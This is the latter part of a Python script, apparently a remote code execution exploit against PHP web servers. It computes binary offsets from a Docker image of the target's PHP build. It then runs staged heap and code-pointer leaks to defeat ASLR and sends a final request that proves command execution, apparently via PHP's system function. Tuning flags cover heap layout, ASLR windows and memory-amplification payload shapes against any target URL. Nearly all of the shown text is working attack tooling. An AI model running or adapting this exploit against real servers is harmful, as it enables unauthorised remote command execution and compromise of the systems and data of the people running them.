def _cache_save(image: str, platform: str | None, php_path: str | None,
                dtor_low21: int, zif_from_dtor: int, php_version: str) -> None:
    """Persist calculator results for reuse."""
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    path = CACHE_DIR / f"{_cache_key(image, platform, php_path)}.json"
    path.write_text(json.dumps({
        "image": image,
        "platform": platform,
        "php_path": php_path,
        "DTOR_LOW21": dtor_low21,
        "ZIF_SYSTEM_FROM_DTOR": zif_from_dtor,
        "php_version": php_version,
    }, indent=2) + "\n")


def calculate_offsets(image: str,
                      platform: str | None = None,
                      php_path: str | None = None,
                      recalculate: bool = False) -> tuple[int, int, str]:
    """Return (DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR, php_version_string)."""

    if not recalculate:
        cached = _cache_load(image, platform, php_path)
        if cached is not None:
            print(f"[calc] cache hit for {image}", flush=True)
            return cached

    plat_msg = f" ({platform})" if platform else ""
    print(f"[calc] pulling {image}{plat_msg} ...", flush=True)
    pull_cmd = ["docker", "pull"]
    if platform:
        pull_cmd += ["--platform", platform]
    pull_cmd.append(image)
    rc, _, err = run_cmd(pull_cmd)
    if rc != 0:
        raise RuntimeError(f"docker pull failed: {err.strip()}")

    php_version = docker_php_version(image, platform)
    if not php_version:
        raise RuntimeError(f"Cannot determine PHP version from {image}")
    print(f"[calc] PHP {php_version}", flush=True)

    if not php_path:
        php_path = docker_find_php(image, platform)
    print(f"[calc] binary: {php_path}", flush=True)

    symbols: dict[str, int] = {}
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir_p = Path(tmpdir)
        binary = docker_extract(image, php_path, tmpdir_p, platform)
        print(f"[calc] extracted ({binary.stat().st_size:,} bytes)", flush=True)

        libphp = docker_find_libphp(image, platform)
        binaries = [binary]
        if libphp:
            try:
                binaries.append(docker_extract(image, libphp, tmpdir_p, platform))
            except RuntimeError:
                pass

        for b in binaries:
            analyse_binary(b, symbols)

    offsets = compute_offsets(symbols)
    if "error" in offsets:
        raise RuntimeError(f"offset calculation failed: {offsets['error']}")

    result = (offsets["DTOR_LOW21"], offsets["ZIF_SYSTEM_FROM_DTOR"], php_version)
    _cache_save(image, platform, php_path, *result)
    print(f"[calc] cached to {CACHE_DIR}/", flush=True)
    return result


def _make_preflight():
    """Return a preflight function that checks the target is reachable."""
    def _preflight(target):
        cls = (http.client.HTTPSConnection if target.scheme == "https"
               else http.client.HTTPConnection)
        conn = cls(target.host, target.port, timeout=12)
        try:
            conn.request("GET", target.path, headers={"Connection": "close"})
            resp = conn.getresponse()
            resp.read(4096)
            if resp.status != 200:
                raise RuntimeError(
                    f"Target returned HTTP {resp.status}, expected 200")
        finally:
            conn.close()
    return _preflight


def apply_all(args, dtor_low21: int, zif_from_dtor: int,
              php_version: str) -> None:
    """Set every module-level calibration global from CLI args + calculator."""
    global PHP_VERSION, DTOR_LOW21, ZIF_SYSTEM_FROM_DTOR
    global HEAP_MIN, HEAP_MAX, CODE_MIN, CODE_MAX
    global HEAP_CARRIER_DELTA, HEAP_CARRIER_OFFSET
    global CONSUMERS, COOKIE_PAIRS, preflight

    PHP_VERSION          = f"PHP/{php_version}"
    DTOR_LOW21           = dtor_low21
    ZIF_SYSTEM_FROM_DTOR = zif_from_dtor

    HEAP_MIN = args.heap_min
    HEAP_MAX = args.heap_max
    CODE_MIN = args.code_min
    CODE_MAX = args.code_max

    HEAP_CARRIER_DELTA  = args.heap_carrier_delta
    HEAP_CARRIER_OFFSET = args.heap_carrier_offset

    CONSUMERS    = args.consumers
    COOKIE_PAIRS = args.cookie_pairs

    STAGES["heap"] = LeakStage(
        name="heap",
        producer=ProducerShape(
            depth=args.heap_depth,
            count=args.heap_count,
            field_count=args.heap_field_count,
            field_value_size=args.heap_field_value_size,
        ),
        build_consumer=heap_consumer,
        read_candidate=heap_candidate,
        leak_cookie_bytes=256,
        describes="Zend chunk base",
    )
    STAGES["code"] = LeakStage(
        name="code",
        producer=ProducerShape(
            depth=args.code_depth,
            count=args.code_count,
            field_count=args.code_field_count,
            field_value_size=args.code_field_value_size,
        ),
        build_consumer=code_consumer,
        read_candidate=code_candidate,
        leak_cookie_bytes=16,
        describes="zval_ptr_dtor",
    )

    preflight = _make_preflight()


def run_exploit(url: str, image: str, platform: str, output: Path) -> dict:
    """Execute all four stages and return the aggregated result dict."""
    target = parse_target(url)

    result: dict = {
        "target":   url,
        "image":    image,
        "platform": platform,
        "calibration": {
            "DTOR_LOW21":           hex(DTOR_LOW21),
            "ZIF_SYSTEM_FROM_DTOR": hex(ZIF_SYSTEM_FROM_DTOR),
            "PHP_VERSION":          PHP_VERSION,
            "HEAP_CARRIER_DELTA":   hex(HEAP_CARRIER_DELTA),
            "HEAP_CARRIER_OFFSET":  hex(HEAP_CARRIER_OFFSET),
            "HEAP_MIN":             hex(HEAP_MIN),
            "HEAP_MAX":             hex(HEAP_MAX),
            "CODE_MIN":             hex(CODE_MIN),
            "CODE_MAX":             hex(CODE_MAX),
            "CONSUMERS":            CONSUMERS,
            "COOKIE_PAIRS":         COOKIE_PAIRS,
            "heap_producer":        str(STAGES["heap"].producer),
            "code_producer":        str(STAGES["code"].producer),
        },
        "started_utc":  dt.datetime.now(dt.UTC).isoformat(),
        "stage_order":  ["calc", "health", "heap", "code", "final"],
        "output_dir":   str(output),
    }

    try:
        preflight(target)
        print("[health] target reachable", flush=True)

        heap, result["heap"] = run_leak_stage(target, STAGES["heap"], output)
        print(f"[heap] strict Zend base {heap:#x}", flush=True)

        dtor, result["code"] = run_leak_stage(target, STAGES["code"], output)
        print(f"[code] strict zval_ptr_dtor {dtor:#x}", flush=True)

        nonce = secrets.token_hex(8)
        final = final_request(target, heap, dtor, nonce, output)
        result["final"] = final
        print(json.dumps({
            "stage": "final",
            "nonce": nonce,
            "execution_proof_verified": final["execution_proof_verified"],
            "response_path":           final["response_path"],
        }), flush=True)

        rpath = Path(final["response_path"])
        if rpath.is_file():
            print("\n--- Response Body ---")
            print(rpath.read_bytes().decode("utf-8", errors="replace"))
            print("---------------------")

        result["success"] = final["execution_proof_verified"]
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
        result["success"] = False
        print(f"[abort] {result['error']}", file=sys.stderr, flush=True)
    finally:
        result["completed_utc"] = dt.datetime.now(dt.UTC).isoformat()
        (output / "run.json").write_text(json.dumps(result, indent=2) + "\n")

    return result


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def auto_int(value: str) -> int:
    return int(value, 0)


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # ── Required ─────────────────────────────────────────────────────────
    ap.add_argument("--url",   required=True,
                    help="Target endpoint")
    ap.add_argument("--image", required=True,
                    help="Docker image for offset calculation")
    ap.add_argument("--platform", default="linux/amd64",
                    help="Docker platform for image pull "
                         "(default: linux/amd64)")
    ap.add_argument("--php-path",
                    help="Override PHP binary path inside the Docker image "
                         "(default: auto-detect, prefers php-fpm). Use "
                         "/usr/local/bin/php when the target runs 'php -S'.")
    ap.add_argument("--recalculate", action="store_true",
                    help="Ignore cached offsets and recalculate from the image")
    ap.add_argument("--output-dir", type=Path,
                    help="Output directory (auto-generated if omitted)")

    # ── Heap layout (runtime-dependent, needs debugger to measure) ───────
    heap = ap.add_argument_group(
        "heap layout",
        "Distance from leaked chunk base to the controlled buffer. "
        "Depends on worker count, memory_limit, and allocation pattern. "
        "Measure with a debugger attached to a live worker.")
    heap.add_argument("--heap-carrier-delta",  type=auto_int, default=0x8400000,
                      metavar="HEX",
                      help="default: 0x8400000")
    heap.add_argument("--heap-carrier-offset", type=auto_int, default=0x16D1D8,
                      metavar="HEX",
                      help="default: 0x16D1D8")

    # ── ASLR address windows (kernel-dependent) ─────────────────────────
    aslr = ap.add_argument_group(
        "ASLR ranges",
        "Plausible virtual-address windows for heap and code pointers. "
        "Linux x86-64 defaults shown; ARM64 or other kernels differ.")
    aslr.add_argument("--heap-min", type=auto_int, default=0x700000000000,
                      metavar="HEX",
                      help="default: 0x700000000000")
    aslr.add_argument("--heap-max", type=auto_int, default=0x800000000000,
                      metavar="HEX",
                      help="default: 0x800000000000")
    aslr.add_argument("--code-min", type=auto_int, default=0x500000000000,
                      metavar="HEX",
                      help="default: 0x500000000000")
    aslr.add_argument("--code-max", type=auto_int, default=0x700000000000,
                      metavar="HEX",
                      help="default: 0x700000000000")

    # ── Producer geometry (memory-amplification tuning) ──────────────────
    prod = ap.add_argument_group(
        "producer geometry",
        "Controls the nested-name shapes that amplify wire bytes into "
        "in-memory allocations.  Must overshoot memory_limit while "
        "staying under the 1 MiB body cap.")
    prod.add_argument("--heap-depth",            type=int, default=57,
                      help="nesting depth for heap producer (default: 57)")
    prod.add_argument("--heap-count",            type=int, default=950,
                      help="file-control count for heap producer (default: 950)")
    prod.add_argument("--heap-field-count",      type=int, default=50,
                      help="padding fields for heap producer (default: 50)")
    prod.add_argument("--heap-field-value-size", type=int, default=1,
                      help="padding field value size for heap (default: 1)")
    prod.add_argument("--code-depth",            type=int, default=58,
                      help="nesting depth for code producer (default: 58)")
    prod.add_argument("--code-count",            type=int, default=935,
                      help="file-control count for code producer (default: 935)")
    prod.add_argument("--code-field-count",      type=int, default=65,
                      help="padding fields for code producer (default: 65)")
    prod.add_argument("--code-field-value-size", type=int, default=39,
                      help="padding field value size for code (default: 39)")

    # ── Leak tuning ──────────────────────────────────────────────────────
    tune = ap.add_argument_group(
        "leak tuning",
        "Consumer count and cookie-header ballast.")
    tune.add_argument("--consumers",   type=int, default=8,
                      help="pipelined consumers per leak stage (default: 8)")
    tune.add_argument("--cookie-pairs", type=int, default=1001,
                      help="empty cookie names on each producer (default: 1001)")

    args = ap.parse_args()

    # ── Calculate code offsets ───────────────────────────────────────────
    try:
        dtor_low21, zif_from_dtor, php_version = calculate_offsets(
            args.image, args.platform, args.php_path, args.recalculate)
    except RuntimeError as exc:
        print(f"[abort] {exc}", file=sys.stderr, flush=True)
        return 1

    print(f"[calc] DTOR_LOW21           = {format_hex(dtor_low21)}", flush=True)
    print(f"[calc] ZIF_SYSTEM_FROM_DTOR = {format_hex(zif_from_dtor)}", flush=True)
    print(f"[calc] PHP_VERSION          = PHP/{php_version}", flush=True)

    # ── Apply all constants ──────────────────────────────────────────────
    apply_all(args, dtor_low21, zif_from_dtor, php_version)

    # ── Run ──────────────────────────────────────────────────────────────
    stamp = dt.datetime.now(dt.UTC).strftime("%Y%m%dT%H%M%S%fZ")
    output = args.output_dir or Path(f"tmp/poc-run-{stamp}")
    output.mkdir(parents=True, exist_ok=False)

    result = run_exploit(args.url, args.image, args.platform, output)
    return 0 if result.get("success") else 1


if __name__ == "__main__":
    raise SystemExit(main())
